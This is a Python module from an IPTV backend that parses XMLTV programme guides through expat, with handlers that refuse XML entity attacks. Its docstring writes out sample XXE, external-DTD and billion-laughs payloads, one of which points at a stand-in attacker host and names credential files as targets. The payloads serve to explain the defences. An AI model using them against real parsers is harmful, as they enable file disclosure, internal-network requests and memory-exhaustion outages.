"""XMLTV parsing, hardened against XML entity attacks (NX-EPG).

XMLTV (http://wiki.xmltv.org/) is the de-facto interchange format for programme
guides. The subset that matters here is small:

    <tv>
      <channel id="tvn.ec"><display-name>TVN</display-name></channel>
      <programme start="20260731080000 -0500"
                 stop="20260731100000 -0500"
                 channel="tvn.ec">
        <title lang="es">Noticiero</title>
        <desc lang="es">…</desc>
      </programme>
    </tv>


═══════════════════════════════════════════════════════════════════════════════
 THE SECURITY CONTROL — WHY THIS MODULE EXISTS INSTEAD OF `ElementTree.parse`
═══════════════════════════════════════════════════════════════════════════════

The EPG source is a URL or file supplied by configuration and served by a THIRD
PARTY. Its bytes are untrusted input that this backend parses unattended, in a
background task, with database credentials and network access. Three distinct
attacks follow from parsing that with a default XML parser; all three are closed
here, by refusing the language constructs they are built on rather than by
trying to detect them.


ATTACK 1 — External entity → arbitrary local file disclosure (classic XXE)

    <!DOCTYPE tv [<!ENTITY x SYSTEM "file:///etc/passwd">]>
    <tv><programme …><title>&x;</title></programme></tv>

  A parser that resolves external entities reads the file and substitutes its
  contents into the document. Here that content would be stored as a programme
  title and then handed straight back to any authenticated subscriber through
  GET /api/client/catalog/channels/{key}/epg. In this container the interesting
  targets are not /etc/passwd but /app/.env (POSTGRES_PASSWORD, SECRET_KEY, the
  Flussonic read-only credentials) — i.e. full compromise of the playback gate,
  exfiltrated through a public API response.

  Closed by: `EntityDeclHandler` refuses the declaration itself, and
  `ExternalEntityRefHandler` refuses every external reference. Nothing is
  fetched, nothing is opened.

  Note: CPython's `xml.etree.ElementTree` happens to raise "undefined entity"
  here already. That is a side effect of ElementTree not implementing entity
  resolution, not a security control we chose, it is not guaranteed by the API
  contract, and it says nothing about attacks 2 and 3. The refusal below is
  explicit, tested, and does not depend on which parser the stdlib ships next.

ATTACK 2 — External DTD → SSRF, and file disclosure via a parameter entity

    <!DOCTYPE tv SYSTEM "http://attacker.example/evil.dtd">

  The parser fetches that URL. The request originates INSIDE the production
  network, from a host that can reach the Flussonic management APIs, Redis and
  Postgres — none of which are reachable from the Internet. That turns the EPG
  ingest into an SSRF pivot, and the fetched DTD can additionally declare
  parameter entities that exfiltrate local files to the attacker's server (the
  "out-of-band XXE" variant, which works even when the parsed result is never
  displayed).

  Closed by: `SetParamEntityParsing(…_NEVER)`, which stops expat from resolving
  parameter entities and external DTD subsets at all, plus
  `ExternalEntityRefHandler` raising on anything that still reaches it. The
  external DTD is never fetched, so there is no request to pivot with and no
  parameter entity to exfiltrate through.

  Note what is deliberately NOT done: a bare `<!DOCTYPE tv SYSTEM "xmltv.dtd">`
  is TOLERATED, because real XMLTV generators emit it and refusing it would
  reject legitimate feeds for no gain — the danger was never the declaration,
  it was fetching what it points at, and that is what is switched off.

ATTACK 3 — Recursive internal entities → memory exhaustion ("billion laughs")

    <!DOCTYPE tv [
      <!ENTITY a "aaaaaaaaaa">
      <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
      … nine more levels …
    ]>
    <tv>&j;</tv>

  Ten levels of ten expand a few hundred bytes into ~1 GB of resident memory. No
  external access is involved, so a parser that "only" blocks external entities
  does not stop it. This one is NOT theoretical for us: verified on this
  project's interpreter (CPython 3.14.5), `ElementTree.fromstring` expands the
  two-level version above in full. In the container the OOM killer takes the
  API process — the ingest runs in the same process that serves playback
  authorisation, so a hostile EPG feed is a denial of service on the entire
  service, on a timer.

  Closed by: `StartDoctypeDeclHandler` refuses any DOCTYPE that carries an
  INTERNAL SUBSET (`<!DOCTYPE tv [ … ]>`) — the only place a document can
  declare its own entities — and `EntityDeclHandler` independently refuses any
  entity declaration that reaches it. Two refusals for one attack on purpose:
  either alone suffices, so a future relaxation of one cannot silently reopen
  the hole.


WHY NOT `defusedxml`
────────────────────
`defusedxml` is the usual answer and would be a defensible one, but it is a NEW
RUNTIME DEPENDENCY in requirements.txt, which means rebuilding and redeploying
the production image for a control that is ~15 lines of handler registration
against a module (`xml.parsers.expat`) already in the standard library and
already loaded by anything that touches XML. This module gets the same guarantee
with no new supply-chain surface, and — the part that actually matters — the
refusals are visible AT THE CALL SITE, so a reviewer can see what is blocked
instead of trusting that a wrapper import is still doing its job.

The stdlib's own `xml.etree.ElementTree` was not merely configured because
Python 3.9 removed `XMLParser.parser`, the only supported handle on the
underlying expat object; on 3.14 there is no supported way to install these
handlers through ElementTree at all. Driving expat directly is what remains.

STREAMING, NOT DOM
──────────────────
Handlers are also the right shape for the job independently of security: a week
of guide for 41 channels is a multi-megabyte document with tens of thousands of
<programme> elements. This parser emits one `ParsedProgramme` per element and
never holds a tree, so peak memory is bounded by the largest single programme,
not by the file. `EPG_MAX_SOURCE_BYTES` bounds the input itself (a decompression
/size bomb is the one remaining resource attack, and expat cannot help with it).
"""
import logging
import re
import xml.parsers.expat
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone

logger = logging.getLogger(__name__)

#: Hard ceiling on the source document. A guide for 41 channels × 7 days is a
#: few MB; 64 MB is generous and still bounds what a hostile feed can make this
#: process allocate before parsing even starts.
EPG_MAX_SOURCE_BYTES = 64 * 1024 * 1024


class XmltvSecurityError(Exception):
    """The document used an XML construct this parser refuses outright.

    Separate from XmltvParseError because it is not a malformed feed — it is a
    feed doing something that only an attack (or a badly broken generator) does.
    Callers log these loudly; they must never be swallowed as "empty guide".
    """


class XmltvParseError(Exception):
    """The document is not parseable XMLTV (malformed XML, wrong root, …)."""


@dataclass(frozen=True, slots=True)
class ParsedProgramme:
    """One <programme>, already normalised to UTC. Channel is the FEED's id."""

    xmltv_channel_id: str
    start_at: datetime
    end_at: datetime
    title: str
    description: str | None


# ── XMLTV timestamps ─────────────────────────────────────────────────────────
#
# The format is `YYYYMMDDHHMMSS` optionally followed by whitespace and a
# `+HHMM` / `-HHMM` offset. Seconds (and even minutes/hours) may be omitted by
# lenient generators, so the digits are matched as a prefix and padded.
_TS_RE = re.compile(
    r"^(?P<digits>\d{8,14})\s*(?P<sign>[+-])?(?P<oh>\d{2})?(?P<om>\d{2})?$"
)


def parse_xmltv_timestamp(raw: str) -> datetime:
    """`20260731080000 -0500` → aware UTC datetime.

    A timestamp with NO offset is read as UTC. XMLTV says an offset-less value is
    in the sender's local time, which we do not know; guessing the server's local
    zone would make the same file import differently on two machines, so the one
    interpretation that is reproducible is chosen and documented instead.
    """
    m = _TS_RE.match((raw or "").strip())
    if not m:
        raise XmltvParseError(f"unparseable XMLTV timestamp: {raw!r}")

    digits = m.group("digits")
    # Pad a truncated stamp out to full seconds: 202607310800 → 20260731080000.
    digits = digits.ljust(14, "0")
    try:
        naive = datetime.strptime(digits, "%Y%m%d%H%M%S")
    except ValueError as exc:
        raise XmltvParseError(f"invalid XMLTV timestamp {raw!r}: {exc}") from exc

    if m.group("sign") and m.group("oh"):
        offset = timedelta(hours=int(m.group("oh")), minutes=int(m.group("om") or 0))
        if m.group("sign") == "-":
            offset = -offset
        return (naive.replace(tzinfo=timezone.utc) - offset).astimezone(timezone.utc)

    return naive.replace(tzinfo=timezone.utc)


# ── The hardened parser ──────────────────────────────────────────────────────


def _harden(parser: "xml.parsers.expat.XMLParserType") -> None:
    """Install the refusals described at length in the module docstring.

    Every handler RAISES rather than returning a "skip" value. Expat propagates
    the exception out of `Parse()`, so the document is abandoned at the first
    hostile construct — before the entity is expanded, before the URL is fetched,
    and with nothing partially ingested.
    """

    def _reject_doctype(name, sysid, pubid, has_internal_subset):
        # Attack 3 (and attack 1's usual delivery vehicle). The internal subset
        # is the ONLY place a document can declare its own entities, so refusing
        # it removes the entity bomb and the inline `<!ENTITY x SYSTEM "file:…">`
        # in one move — before expat expands anything.
        #
        # A DOCTYPE WITHOUT an internal subset is allowed through: real XMLTV
        # generators emit `<!DOCTYPE tv SYSTEM "xmltv.dtd">`, and it is harmless
        # here because SetParamEntityParsing(NEVER) below means that external
        # subset is never fetched or interpreted.
        if not has_internal_subset:
            return
        raise XmltvSecurityError(
            f"XMLTV source declares a DOCTYPE ({name!r}) with an internal "
            "subset: refused. That is where an entity bomb ('billion laughs', "
            "exponential expansion until the process is OOM-killed) and an "
            "inline `<!ENTITY … SYSTEM \"file:///…\">` file-disclosure payload "
            "are declared. Strip the internal subset from the feed."
        )

    def _reject_entity_decl(*args, **kwargs):
        # Attacks 1 and 3, second line of defence. Normally unreachable — the
        # internal-subset refusal above fires first — and kept precisely so that
        # relaxing that decision cannot silently reopen the hole.
        raise XmltvSecurityError(
            "XMLTV source declares an XML entity: refused. Recursive entity "
            "declarations expand exponentially and exhaust the process memory "
            "('billion laughs')."
        )

    def _reject_external_entity(context, base, sysid, pubid):
        # Attack 1 (and the out-of-band variant of attack 2).
        raise XmltvSecurityError(
            f"XMLTV source references an external entity (system_id={sysid!r}): "
            "refused. Resolving it would read local files (.env holds the "
            "database and Flussonic credentials) or issue requests from inside "
            "the production network."
        )

    parser.StartDoctypeDeclHandler = _reject_doctype
    parser.EntityDeclHandler = _reject_entity_decl
    parser.UnparsedEntityDeclHandler = _reject_entity_decl
    parser.ExternalEntityRefHandler = _reject_external_entity
    # Belt and braces: even with the handlers above, tell expat not to go looking
    # for parameter entities in the first place.
    parser.SetParamEntityParsing(xml.parsers.expat.XML_PARAM_ENTITY_PARSING_NEVER)


def parse_xmltv(data: bytes) -> list[ParsedProgramme]:
    """Parse an XMLTV document into programmes. Never returns partial results.

    Raises XmltvSecurityError for a refused construct (see module docstring) and
    XmltvParseError for a malformed or non-XMLTV document. A single unusable
    <programme> (bad timestamp, missing title) is SKIPPED and counted rather than
    raised: one bad row in a third-party feed must not cost the other 40 channels
    their guide.
    """
    if not isinstance(data, (bytes, bytearray)):
        raise XmltvParseError("XMLTV source must be bytes")
    if len(data) > EPG_MAX_SOURCE_BYTES:
        raise XmltvSecurityError(
            f"XMLTV source is {len(data)} bytes, over the "
            f"{EPG_MAX_SOURCE_BYTES}-byte ceiling: refused without parsing."
        )

    programmes: list[ParsedProgramme] = []
    skipped = 0

    # Mutable state for the streaming handlers. `current` holds the attributes of
    # the <programme> being read; `text_into` names the child element whose
    # character data is currently being accumulated.
    current: dict | None = None
    text_into: str | None = None
    buf: list[str] = []
    seen_root = False

    def start_element(name: str, attrs: dict) -> None:
        nonlocal current, text_into, buf, seen_root
        if name == "tv":
            seen_root = True
        elif name == "programme":
            current = dict(attrs)
            current["_title"] = None
            current["_desc"] = None
        elif current is not None and name in ("title", "desc"):
            # First occurrence wins: XMLTV repeats <title> once per language and
            # there is no locale on this API to choose between them.
            if current["_title" if name == "title" else "_desc"] is None:
                text_into = name
                buf = []

    def char_data(data: str) -> None:
        if text_into is not None:
            buf.append(data)

    def end_element(name: str) -> None:
        nonlocal current, text_into, buf, skipped
        if name in ("title", "desc") and text_into == name:
            value = "".join(buf).strip()
            if current is not None:
                current["_title" if name == "title" else "_desc"] = value or None
            text_into = None
            buf = []
        elif name == "programme" and current is not None:
            try:
                programmes.append(_build(current))
            except XmltvParseError as exc:
                skipped += 1
                logger.warning("[epg] skipping unusable <programme>: %s", exc)
            current = None
            text_into = None

    parser = xml.parsers.expat.ParserCreate()
    _harden(parser)
    parser.StartElementHandler = start_element
    parser.EndElementHandler = end_element
    parser.CharacterDataHandler = char_data

    try:
        parser.Parse(bytes(data), True)
    except XmltvSecurityError:
        raise
    except xml.parsers.expat.ExpatError as exc:
        raise XmltvParseError(f"malformed XMLTV document: {exc}") from exc

    if not seen_root:
        raise XmltvParseError("document has no <tv> root element — not XMLTV")

    if skipped:
        logger.warning("[epg] %d <programme> element(s) skipped as unusable", skipped)
    return programmes


def _build(raw: dict) -> ParsedProgramme:
    """One <programme>'s attributes → ParsedProgramme, or XmltvParseError."""
    channel = (raw.get("channel") or "").strip()
    if not channel:
        raise XmltvParseError("<programme> has no channel attribute")

    title = raw.get("_title")
    if not title:
        raise XmltvParseError(f"<programme channel={channel!r}> has no title")

    start_at = parse_xmltv_timestamp(raw.get("start", ""))
    stop = (raw.get("stop") or "").strip()
    if not stop:
        raise XmltvParseError(
            f"<programme channel={channel!r} start={raw.get('start')!r}> has no "
            "stop attribute; an end time cannot be invented"
        )
    end_at = parse_xmltv_timestamp(stop)

    if end_at <= start_at:
        raise XmltvParseError(
            f"<programme channel={channel!r}> ends at or before it starts "
            f"({start_at.isoformat()} → {end_at.isoformat()})"
        )

    return ParsedProgramme(
        xmltv_channel_id=channel,
        start_at=start_at,
        end_at=end_at,
        title=title,
        description=raw.get("_desc"),
    )
